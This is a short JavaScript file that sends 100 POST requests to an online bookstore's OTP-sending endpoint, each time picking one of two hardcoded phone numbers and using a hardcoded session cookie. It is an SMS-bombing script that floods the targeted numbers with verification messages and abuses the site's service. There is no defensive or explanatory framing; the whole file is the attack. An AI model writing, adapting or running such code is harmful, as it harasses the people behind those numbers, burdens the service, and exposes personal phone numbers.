const length = 100;
for (let i = 0; i < length; i++) {
    const array_number = ['01602830626', '01518670384']

    const randomIndex = Math.floor(Math.random() * array_number.length);
    const phone = array_number[randomIndex];

    var myHeaders = new Headers();
    myHeaders.append("Cookie", "JSESSIONID=ECF59F4240DC2A323F76E6EA556364D9");

    var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        redirect: 'follow'
    };

    fetch(`https://www.rokomari.com/otp/send?emailOrPhone=88${phone}&countryCode=BD`, requestOptions)
        .then(response => response.text())
        .then(result => console.log(result))
        .catch(error => console.log('error', error));
    
}


